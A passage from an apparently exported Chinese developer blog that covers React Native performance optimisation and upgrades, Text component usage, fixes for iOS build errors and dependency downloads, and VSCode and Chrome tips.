<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8973f3d7940d9de9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-40029c5e215d9329.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c3cdf376c6f745a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>关注过RN的人知道，其实REACT-NATIVE对于安卓的支持较晚，安卓的性能不是很好，所以我们在安卓上进行较深入的优化。<br>RN是通过reactprop和react method两个注解声明暴露给js的属性和方法的，通过react-native init 的工程中rn框架并未进行优化，所有注解的处理是在运行时进行，这是一个非常耗时的过程。此外，通过反射的形式修改属性和调用方法也是不高效的。我们基于rn开源项目，编译出自己的rn库，完成了对注解的编译时优化。rn开源代码中有react prop注解的处理器，只需要开启就行。右边这幅图就是编译过程中生成的优化代码。针对react method注解的优化思路也是类似，我们自己开发出一套注解处理器，并修改rn源码，使优化生效。右边这幅图展示的就是编译阶段生成的优化代码。通过注解的编译时优化，rn框架初始化过程中的关键方法处理速度提升了60倍。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9f76b114a1aeeabc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>除了注解优化，我们还对rn框架进行了诸多优化。<br>这些措施包括了比如我们在iOS方面的RCTImage改造，支持共享客户端缓存，支持动态注册RN模块，清除日志相关影响，无操作时，尽量不去执行刷新操作。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-6437a0f4b2e9fed1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>RN主要性能瓶颈在Javascript的执行 ，JS也是非常耗时的。RN框架代码是整体比较大，压缩之后大概500多K，如果多个业务接入RN的话，每个业务都打包框架代码时，造成很多资源浪费。业务开发并不关心当前框架是什么版本，只负责业务开发的，我们把框架代码独立更加方便于其他业务进行接入，方便业务进行开发。<br>我们做了JS bundle拆分，分为是框架JS和业务JS，框架JS通过global.react=require（react）,global.reactNative=require（react-native）把react和react-native对象定义为全局变量;业务JS通过webpack替换代码中的react和react-native对象为全局对象，实现RN框架的引入。<br>Bundle拆分后，在执行时还是要合并加载的，单我们不是简单的把框架JS和业务JS直接合并，那样拆分就没有太多意义。我们这边提出了一个新的方案，只加载一个框架JS，因为所有的业务JS执行都是基于框架执行的，加载一个RN框架就可以支撑所有的业务，你不需要再去对每个业务执行框架；对于单独加载框架JS，我们做过统计，哪怕只加载RN框架的话，其实耗时也是很严重的；所以我们加载业务JS都是基于当前的框架去执行的。通过这样的方式我们实现了RN的单实例共享。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-276644512e726e96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>其他方面，我们去JS加载做了一些其他的优化，比如JS moudle加载之后，我们会把它放到这里面，不会重复加载，当有相同业务打开的时候，我们去执行缓存中的JS代码。APP启动的时候，我们预加载RN实例，我们在打开APP的时候，我们先把框架执行，当打开RN业务时，我们这个时候不需要再去执行整个框架，我们直接执行业务代码，这样就会大大提升业务整体的性能，我们对于业务JS进行智能预加载。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-6514e5443290fb01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>我们在商品详情页启动耗时，有一半的业务场景在400毫秒到300毫秒打开，这个能够保证我们的页面完成最基本的要求就是秒开的场景。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-2c81b8e6aa60111a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5e86df631134e037.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>RN一个优势就是支持灵活发布，我们能对业务进行热更新，我们有一个专门管理和发布的平台。我们RN开发统一在git上开发，所有业务放在Git仓库；为了RN打包，我们基于Node开发了自动化打包平台，当需要发布业务的时候，我们通过自动化打包平台，自动化去打包生成业务和框架的zip包，上传到我们的发布系统，发布系统根据新的zip包，进行BSDIFF算法生成增量更新，这样用户更新不需要现在这个新业务zip包，只需要下载diff增量内容，<br>最大限度的降低用户流量，统计下来增量升级流量降低90%以上。这个时候如果我们对应的业务需要打开对应的RN的业务的时候，我们先去读取配置，这个决定你当前的版本是否支持RN，然后打开业务。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0088928e23b9583f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-97cb7ac0864cb890.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>RN支持使用Native组件，但是我们在开发中并不是全部依赖于native组件，自定义组件开发有对应的原则，优先使用Native已有的UI组件，如自定义键盘、密码。减少Native与JS间的交互，如倒计时。JS实现效果不佳或者实现困难，如滚轮选择器（picker）。现有组件无法支持当前业务需求，如列表组件（TableView）。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f1249558ac8b1088.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>RN提供的listview几乎无复用和flatview是基于原生组件的滚动事件进行复用，这样会有一定的延时，原生列表组件在复用上更加高效，所以基于原生组件上，开发了自己的RN列表组件；如图是我们在优化TableView的修改思路。优化过后有非常大的提升。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ba16b2305c7a8815.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>大家看一下这是我们现在REACT-NATIVE实现的业务场景。绿色的就是我们经常看到的所谓的60帧的刷新频率线，现在的页面基本上正常滚动的话，都是在60帧，整体体验是非常接近原生的。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b5cefe1b5284ec2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a82a765cd5d68a45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>RN包括JS，包括Native都需要对异常进行捕获，因为RN异常会造成App的crush，这样对于整体业务体验非常不理想，我们做了对应的捕获方案。</p>
<p>我们分为两块，一个就是JS异常，还有就是Native异常。JS异常我们使用RN提供的使用ErrorUtils全局捕获异常。Native异常，Android通过SetNativeModuleCallEXceptionHandler捕获；iOS通过捕获RCTCurrentFatalHandler的红屏错误，并监听RCTJavaScriptDidFailToLoadNotification 的异常通知，另外在打开业务时会检测RCTRootView，如果5秒内未加载ContentView也会认为异常。 捕获到异常我们会记录异常灰度，并对业务进行降级跳转到H5页面</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-da7b7fd0ff3d3957.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>RN框架版本升级，RN开发是2017年开始进行，版本为0382，RN框架升级迭代是非常快的，现在已经到54了；RN的框架升级过程中，框架自己也在解决自己的Bug，性能也是提高很多，稳定性也提升了。Native端框架整体性能、稳定性提升，其中Android布局方式发生了很大的变化<br>；React.js版本由15升级到16，在异常处理，服务端渲染和核心架构方面（引入 Fiber）都有了重大更新。基于此我们要升级我们对应的RN框架，跟上RN整体框架的版本步伐。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9a4ecffbaf5d6cd6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>下面是RN的框架，上面是我们对应的业务，当我们选择去升级RN的时候，这个时候出现了比较严重的问题，由于它的版本差别太大了，整体业务出现很大问题，38版本下的业务代码无法在52版本运行，52版本的业务代码也无法在38版本上运行；开发那边讨论的时候，同时开展两条业务也不太现实，产品也不同意放弃旧的框架业务，基于此，我们做了一个框架兼容层，去屏蔽掉38和52的框架差异，实现基于一套业务代码能够同时在38和52上面同时运行，对于业务来讲，不需要关注框架的一些差异，只是按照对应的业务开发业务代码。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-663c02b507ddb0ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>在升级的时候我们查看了了React和React-native的变动日志。React升级变动，废弃React createClass，使用独立包，create-react-class代替。独立React.PropTypes，使用新包prop-types，React-native中使用ViewPropTypes替换View.propTypes 。iOS修改了Native的事件发送机制，由EventDispatcher改为 EventBlock。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-2ea6778d0374176f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>大家可以看到RN框架升级之后，52相对38整体业务有很大的提升，我们现在刚才看到的一个图表，50%的业务我们能够在200毫秒内打开，70%的业务能够在300-400毫秒内，整体业务提升相对以前的38框架大概提升了50%的效果。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9717988db8365892.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c5cb55c11a3e0fbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>RN未来的展望，在APP内部业务RN的逐步替换；JS异常定位；RN单页化，现有业务都是通过native打开，造成数据无法共享，通过单页化，业务通过前端自己打开业务；现在RN是Learn once，Write anywhere，现有业务要求我们即存在RN又有对应的H5场景，同一个需求需要开发2遍，开发压力较大，下期目标实现Write once，run anywhere，完成同一套代码支持Web和RN；最后就是我们的对外输出RN的自定义组件和解决方案。</p>
]]></content>
      <categories>
        <category>reactnative</category>
      </categories>
  </entry>
  <entry>
    <title>Text组件</title>
    <url>/nirvana/reactnative/react-native/Text%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该Text组件为React中一个基本组件，该和Android中的TextView组件相类似用来显示基本的文本信息，该控件除了基本的显示布局之外，可以进行嵌套显示，设置样式，以及可以做事件(例如:点击)处理。下面我们来一个实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 进行简单Text组件使用实例</span><br><span class="line"> * Sample React Native App  test.android.js</span><br><span class="line"> * https:&#x2F;&#x2F;github.com&#x2F;facebook&#x2F;react-native</span><br><span class="line"> *&#x2F;</span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line">import React, &#123; Component &#125; from &#39;react&#39;;</span><br><span class="line">import &#123;</span><br><span class="line">  AppRegistry,</span><br><span class="line">  Text,</span><br><span class="line">  View,</span><br><span class="line">  StyleSheet,</span><br><span class="line">&#125; from &#39;react-native&#39;;</span><br><span class="line">var styles &#x3D; StyleSheet.create(&#123;</span><br><span class="line">     titleBase:&#123;</span><br><span class="line">        margin:10,</span><br><span class="line">        textAlign:&#39;center&#39;,</span><br><span class="line">        color:&#39;red&#39;,</span><br><span class="line">        fontSize:28,</span><br><span class="line">        fontFamily:&#39;Cochin&#39;,</span><br><span class="line">     &#125;,</span><br><span class="line">     title:&#123;</span><br><span class="line">        color:&#39;green&#39;,</span><br><span class="line">        fontWeight:&#39;bold&#39;,</span><br><span class="line">     &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">var TestText &#x3D; React.createClass(&#123;</span><br><span class="line">  render: function() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;Text style&#x3D;&#123;styles.titleBase&#125;&gt;</span><br><span class="line">         I am root text!</span><br><span class="line">         &lt;Text style&#x3D;&#123;styles.title&#125;&gt;</span><br><span class="line">              I am chid text!</span><br><span class="line">          &lt;&#x2F;Text&gt;</span><br><span class="line">      &lt;&#x2F;Text&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">AppRegistry.registerComponent(&#39;TestText&#39;, () &#x3D;&gt; TestText);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述实例采用TextView的嵌套方式，最外层的Text的Style titleBase定义相关风格，内层的风格style定义相关风格，我们可以看到运行效果，如果内层没有重写外层定义的样式，那么内层会进行继承。如果重写了样式，那么内层会根据自己定义的样式进行渲染，该和CSS样式表差不多。</p>
<h2 id="属性方法-主要一些可用的属性"><a href="#属性方法-主要一些可用的属性" class="headerlink" title="属性方法(主要一些可用的属性)"></a>属性方法(主要一些可用的属性)</h2><ul>
<li>  ①.allowFontScaling (bool):控制字体是否根据iOS的设置进行自动缩放-iOS平台,Android平台不适用</li>
<li>  ②.numberOfLines (number):进行设置Text显示文本的行数，如果显示的内容超过了行数，默认其他多余的信息就不会显示了。</li>
<li>  ③.onLayout (function) 当布局位置发生变动的时候自动进行触发该方法, 其中该function的参数如下: [code lang=”” start=”” highlight=””]{nativeEvent: {layout: {x, y, width, height}}}[/code]</li>
<li>  ④.onPress (fcuntion) 该方法当文本发生点击的时候调用该方法.</li>
</ul>
<h2 id="风格样式"><a href="#风格样式" class="headerlink" title="风格样式"></a>风格样式</h2><ul>
<li>  1.继承可以使用View组件的所有Style(具体查看<a href="http://facebook.github.io/react-native/docs/view.html#style">http://facebook.github.io/react-native/docs/view.html#style</a>)</li>
<li>  2.color:字体颜色</li>
<li>  3.fontFamily 字体名称</li>
<li>  4.fontSize 字体大小</li>
<li>  5.fontStyle 字体风格(normal,italic)</li>
<li>  6.fontWeight 字体粗细权重(“normal”, ‘bold’, ‘100’, ‘200’, ‘300’, ‘400’, ‘500’, ‘600’, ‘700’, ‘800’, ‘900’)</li>
<li>  7.textShadowOffset 设置阴影效果{width: number, height: number}</li>
<li>  8.textShadowRadius 阴影效果圆角</li>
<li>  9..textShadowColor 阴影效果的颜色</li>
<li>  10.letterSpacing 字符间距</li>
<li>  11.lineHeight 行高</li>
<li>  12.textAlign 文本对其方式(“auto”, ‘left’, ‘right’, ‘center’, ‘justify’)</li>
<li>  13.textDecorationLine 横线位置 (“none”, ‘underline’, ‘line-through’, ‘underline line-through’)</li>
<li>  14.textDecorationStyle 线的风格(“solid”, ‘double’, ‘dotted’, ‘dashed’)</li>
<li>  15.textDecorationColor 线的颜色</li>
<li>  16.writingDirection 文本方向(“auto”, ‘ltr’, ‘rtl’)</li>
</ul>
<h2 id="特别注意点"><a href="#特别注意点" class="headerlink" title="特别注意点"></a>特别注意点</h2><h3 id="嵌套特点"><a href="#嵌套特点" class="headerlink" title="嵌套特点"></a>嵌套特点</h3><p>和Web上面一直的设计方案，我们通过嵌套包裹的方案，相同的属性的文本可以用父标签进行包裹，然后内部特殊的文本采用子标签方案，具体例子如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;&#123;fontWeight: &#39;bold&#39;,fontSize:28&#125;&#125;&gt;</span><br><span class="line">      I am bold</span><br><span class="line">      &lt;Text style&#x3D;&#123;&#123;color: &#39;red&#39;&#125;&#125;&gt;</span><br><span class="line">        and red</span><br><span class="line">    &lt;&#x2F;Text&gt;</span><br><span class="line">&lt;&#x2F;Text&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>整体字体格式为bold以及字体大小为28，不过后边的’and red’的字体颜色为红色。</p>
<h3 id="容器布局规则"><a href="#容器布局规则" class="headerlink" title="容器布局规则"></a>容器布局规则</h3><p>FlexBox(弹性布局),</p>
<h3 id="样式继承规格"><a href="#样式继承规格" class="headerlink" title="样式继承规格"></a>样式继承规格</h3><p>组件可以嵌套，而且样式还支持继承，也就说父组件定义了相关样式，如果子组件没有重写样式的话，那么该子组件会继承父组件定义的样式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  Text组件实例演示</span><br><span class="line"> * Sample React Native App</span><br><span class="line"> * https:&#x2F;&#x2F;github.com&#x2F;facebook&#x2F;react-native</span><br><span class="line"> *&#x2F;</span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">import React, &#123; Component &#125; from &#39;react&#39;;</span><br><span class="line">import &#123;</span><br><span class="line">  AppRegistry,</span><br><span class="line">  Text,</span><br><span class="line">  View,</span><br><span class="line">  StyleSheet,</span><br><span class="line">&#125; from &#39;react-native&#39;;</span><br><span class="line">var TestText &#x3D; React.createClass(&#123;</span><br><span class="line">  render: function() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;View&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;&#123;color:&#39;red&#39;&#125;&#125;&gt;</span><br><span class="line">          My Text One  红色。</span><br><span class="line">       &lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;&#123;color:&#39;green&#39;,fontSize:20&#125;&#125;&gt; My Text Two 绿色和字体大小。&lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;&#123;color:&#39;green&#39;,fontFamily:&#39;Cochin&#39;&#125;&#125;&gt; My Text Three 绿色和字体名称。&lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;&#123;color:&#39;pink&#39;,fontWeight:&#39;bold&#39;&#125;&#125;&gt; My Text Four 粉色和加粗。&lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;&#123;color:&#39;gray&#39;,fontStyle:&#39;italic&#39;&#125;&#125;&gt; My Text Five 灰色和斜体。&lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;&#123;textAlign:&#39;center&#39;,fontStyle:&#39;italic&#39;&#125;&#125;&gt; My Text Six 居中和斜体。&lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text numberOfLines&#x3D;&#123;1&#125; style&#x3D;&#123;&#123;textAlign:&#39;center&#39;,fontStyle:&#39;italic&#39;&#125;&#125;&gt;测试行数My Text Six 居中和斜体。My Text Six 居中和斜体。 My Text Six 居中和斜体。&lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;&#123;marginLeft:50,marginTop:50,textAlign:&#39;center&#39;,fontStyle:&#39;italic&#39;&#125;&#125;&gt;设置文本的间距,居左，居顶部50&lt;&#x2F;Text&gt;</span><br><span class="line">       &lt;Text numberOfLines&#x3D;&#123;2&#125; style&#x3D;&#123;&#123;lineHeight:50,textAlign:&#39;center&#39;,fontStyle:&#39;italic&#39;&#125;&#125;&gt;</span><br><span class="line">          测试行高 测试行高 测试行高 测试行高 测试行高 测试行高 测试行高 测试行高 测试行高 测试行高 测试行高 </span><br><span class="line">          测试行高 测试行高 测试行高 测试行高 测试行高 测试行高</span><br><span class="line">       &lt;&#x2F;Text&gt;</span><br><span class="line">      &lt;&#x2F;View&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">AppRegistry.registerComponent(&#39;TestText&#39;, () &#x3D;&gt; TestText);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>1、在使用Text的过程中，实现文本垂直居中、水平居中的效果（iOS和Android通用）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;View  style&#x3D;&#123;styles.textView&#125;&gt;</span><br><span class="line">    &lt;Text style&#x3D;&#123;styles.text&#125;&gt; 水平垂直居中&lt;&#x2F;Text&gt;</span><br><span class="line">&lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line">textView:&#123;</span><br><span class="line">  flexDirection:&#39;column&#39;,</span><br><span class="line">  justifyContent:&#39;center&#39;,</span><br><span class="line">  alignItems:&#39;center&#39;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text:&#123;</span><br><span class="line">    fontSize:12,</span><br><span class="line">    color:&#39;#f2f2f2&#39;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尽量用view去包裹一层Text组件，text组件只负责基础的文字样式，View组件负责对齐方式等。</p>
<p>2、在Android平台上，Text组件里使用paddingLeft 属性，不好使，直接顶着View了。</p>
<p>解决方式：1）将paddingLeft放在View属性上;2）将paddingLeft修改为marginLeft</p>
<p>建议使用第一种方案修改，把对齐方式交给view去处理，Text只负责文本属性的显示。</p>
]]></content>
      <categories>
        <category>reactnative</category>
      </categories>
  </entry>
  <entry>
    <title>react-native-0-63启动问题</title>
    <url>/nirvana/reactnative/react-native/react-native-0-63%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>1、<code>OpenSSL-Universal</code> requires CocoaPods version <code>&gt;= &quot;1.9</code>“<br>podinstall时提示需要把CocoaPods升级到1.9，但是通过brew install CocoaPods，发现安装的版本是1.6.1，brew upgrade CocoaPods 发现版本无法升级，后来查到1.9的版本需要通过<code>gem install -n /usr/local/bin cocoapods --pre</code>才能安装最新的版本<br>2、Typedef redefinition with different types (‘uint8_t’ (aka ‘unsigned char’) vs ‘enum clockid_t’)<br>changing <code>iOS Deployment Target</code> of <code>Flipper-Folly Pods</code> to “iOS 9.0”, this error disappeared.<br><a href="https://user-images.githubusercontent.com/3139234/78309578-52984600-7586-11ea-9d27-cefdc6e7ca0f.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-e337b36acb480adc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a><br>3、 ‘event2/event-config.h’ file not found<br> Flipper-Folly的版本有问题，需要指定版本<br>use_flipper!修改为use_flipper!({ ‘Flipper-Folly’ =&gt; ‘2.3.0’ })<br>重新pod install即可</p>
]]></content>
      <categories>
        <category>reactnative</category>
      </categories>
  </entry>
  <entry>
    <title>iOS-RN-0-45以上版本网络问题无法启动</title>
    <url>/nirvana/reactnative/react-native/iOS-RN-0-45%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[<p>RN iOS 0.45以上版本开始需要依赖一些第三方编译库，但这些库在国内下载都非常困难（一般的翻墙工具都很难下载）<br>未来RN不同版本可能依赖不同版本的第三方编译库，具体所需库和版本请查看<a href="https://github.com/facebook/react-native/blob/master/scripts/ios-install-third-party.sh">ios-install-third-party.sh</a>文件，注意先把左上角的branch切换到对应的版本.</p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-4967270af295b740.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1515804427550.jpg"></p>
<p>在文件最下面找到需要第三方编译库</p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-182697a23377bd82.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1515804585324.jpg"></p>
<p>我现在使用的52版本的内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch_and_unpack glog-0.3.4.tar.gz https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;glog&#x2F;archive&#x2F;v0.3.4.tar.gz 69f91cd5a1de35ead0bc4103ea87294b0206a456 &quot;\&quot;$SCRIPTDIR&#x2F;ios-configure-glog.sh\&quot;&quot;</span><br><span class="line">fetch_and_unpack double-conversion-1.1.5.tar.gz https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;double-conversion&#x2F;archive&#x2F;v1.1.5.tar.gz 96a8aba1b4ce7d4a7a3c123be26c379c2fed1def</span><br><span class="line">fetch_and_unpack boost_1_63_0.tar.gz https:&#x2F;&#x2F;github.com&#x2F;react-native-community&#x2F;boost-for-react-native&#x2F;releases&#x2F;download&#x2F;v1.63.0-0&#x2F;boost_1_63_0.tar.gz c3f57e1d22a995e608983effbb752b54b6eab741</span><br><span class="line">fetch_and_unpack folly-2016.09.26.00.tar.gz https:&#x2F;&#x2F;github.com&#x2F;facebook&#x2F;folly&#x2F;archive&#x2F;v2016.09.26.00.tar.gz f3b928b5039235bad6cece638c597c6684d1e4e6</span><br></pre></td></tr></table></figure>

<p>下载完后需要把文件copy到***~/.rncache***下，然后就可以运行RN程序了</p>
]]></content>
      <categories>
        <category>reactnative</category>
      </categories>
  </entry>
  <entry>
    <title>VSCode设置大小写转换的快捷键</title>
    <url>/nirvana/tool/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/VSCode%E8%AE%BE%E7%BD%AE%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<p>一 、默认情况下VS Code的编辑菜单或快捷键中没有 转换为大写，转换为小写的功能</p>
<p>解决方案1：使用键盘配置，开启转换为小写，转换为大写的快捷键 </p>
<p>以VS中的 快捷键为例：</p>
<p>小写 -》Ctrl+Shift+l</p>
<p>大写=》Ctrl+Shift+U</p>
<p>自定义大小写转换的快捷键步骤如下:</p>
<p> 1.点击【文件】-【首选项】-【键盘快捷方式】菜单。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d5ee5749c318312e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"> </p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-423b8ab14aade804.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>2.输入 “转换为大写”, 会出现搜索结果【转换为大写】,鼠标悬停在该结果上, 点击前面的”加号” 或 双击, 会弹出输入自定义快捷键的弹窗。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-60e4e6fcbe5fa6b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"> </p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3f1c888971fb2a73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"> </p>
<p>3.在键盘上面按下Ctrl、Shift和u, 然后按Enter键, 即可成功绑定转换为大写快捷键。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-65a4b55675f8717b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"> </p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9ecd4ce60718de32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>4.同理，搜索”转换为小写”, 鼠标悬停在结果上, 点击前面的”加号” 或 双击, 弹出设置快捷键的弹窗，在键盘上面按下Ctrl、Shift和l, 然后按Enter键, 即可成功绑定转换为小写快捷键。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7f3e695948c286af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<hr>
<p>##解决方案2，直接修改keybings.json 添加配置</p>
<pre><code>&#123;
    &quot;key&quot;: &quot;ctrl+shift+u&quot;,
    &quot;command&quot;: &quot;editor.action.transformToUppercase&quot;,
    &quot;when&quot;: &quot;editorTextFocus&quot;
&#125;,
&#123;
    &quot;key&quot;: &quot;ctrl+shift+l&quot;,
    &quot;command&quot;: &quot;editor.action.transformToLowercase&quot;,
    &quot;when&quot;: &quot;editorTextFocus&quot;
&#125;
</code></pre>
<p>最终设置的自定义的大小写转换快捷键如下: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">转换为大写: Ctrl+Shift+u</span><br><span class="line">转换为小写: Ctrl+Shift+l</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title>chrome 账号手动同步</title>
    <url>/nirvana/tool/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/chrome-%E8%B4%A6%E5%8F%B7%E6%89%8B%E5%8A%A8%E5%90%8C%E6%AD%A5/</url>
    <content><![CDATA[<p>解决chrome不能自动同步问题，可以进行手动同步。</p>
<p>不需要删除数据，不需要关闭账户！</p>
<p>首先你懂得</p>
<p>chrome地址栏中输入： chrome://sync-internals/<br>进行如图操作</p>
<p>注意：目前这种方式是完全可行的，如果点击disable sync 再次点击 request 等待一会还是没有反应，且网络正常，请尝试关闭并打开一次浏览器再操作。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d2dfb140d7189280?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"><br><img src="https://upload-images.jianshu.io/upload_images/10024246-f0837051d08d3136?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"><br><img src="https://upload-images.jianshu.io/upload_images/10024246-c83c5ed3762650d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title>常用的VS-Code插件</title>
    <url>/nirvana/tool/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E5%B8%B8%E7%94%A8%E7%9A%84VS-Code%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="Bracket-Pair-Colorizer-2"><a href="#Bracket-Pair-Colorizer-2" class="headerlink" title="Bracket Pair Colorizer 2"></a>Bracket Pair Colorizer 2</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-4e1925a599eb769a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>帮助我搞清楚 JavaScript 中复杂的嵌套 promise。顾名思义，它可以让方括号对变色，帮我弄清楚是否在某个地方搞糊涂了（例如缺少方括号）。它默认匹配 ()、[] 和{}等普通括号，但如果需要你也可以定义自定义括号。<br>它还有其他许多很酷的功能，例如定义颜色或为活动括号显示装订线之类。值得尝试一波。<br><strong>项目地址</strong><br><a href="https://github.com/CoenraadS/Bracket-Pair-Colorizer-2">https://github.com/CoenraadS/Bracket-Pair-Colorizer-2</a><br> <strong>Marketplace</strong><br><a href="https://marketplace.visualstudio.com/items?itemName=CoenraadS.bracket-pair-colorizer-2">https://marketplace.visualstudio.com/items?itemName=CoenraadS.bracket-pair-colorizer-2</a></p>
